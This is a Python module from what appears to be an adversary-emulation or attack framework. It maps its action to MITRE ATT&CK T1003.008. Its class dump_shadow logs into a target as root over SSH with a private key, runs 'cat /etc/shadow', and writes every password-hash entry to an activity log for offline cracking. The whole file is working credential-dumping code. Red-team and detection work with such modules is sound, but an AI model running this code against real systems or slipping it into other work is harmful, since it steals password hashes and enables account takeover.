import logging

from modules.base_module import APT_MODULE
from models.target import Target, MESSAGE_TYPE
from models.module_metadata import AttackTactic, TargetOS, TargetArch
from utils.ssh_helper import ssh_exec


class dump_shadow(APT_MODULE):
    name = "Dump /etc/shadow"
    description = (
        "Reads /etc/shadow on the target to retrieve hashed passwords for all local "
        "user accounts. Requires root-level SSH access. Results are logged to the "
        "activity log for offline cracking."
    )
    tactic = AttackTactic.CREDENTIAL_ACCESS
    technique_id = "T1003.008"
    technique_name = "OS Credential Dumping: /etc/passwd and /etc/shadow"
    compatible_os = [TargetOS.LINUX]
    compatible_arch = [TargetArch.ANY]

    ssh_user = "root"
    ssh_port = 22
    ssh_key_path = "~/.ssh/id_rsa"

    def __init__(self) -> None:
        super().__init__()

    def action(self, target: Target):
        target.log_activity("Dumping /etc/shadow...", True)
        stdout, stderr, rc = ssh_exec(
            target.ip_label, "cat /etc/shadow",
            user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
        )

        if rc != 0 or not stdout.strip():
            logging.log(logging.ERROR, f"dump_shadow [{target.ip_label}]: {stderr}")
            target.log_activity(
                f"Failed to read /etc/shadow: {stderr.strip() or 'empty output'}",
                True, MESSAGE_TYPE.ERROR,
            )
            return

        lines = [l for l in stdout.strip().splitlines() if l]
        target.log_activity(f"Retrieved {len(lines)} shadow entries:")
        for line in lines:
            target.log_activity(f"  {line}")
        target.log_activity(
            f"Dumped {len(lines)} entries from /etc/shadow", True, MESSAGE_TYPE.SUCCESS)

    def enable(self, e):
        self.enabled = e
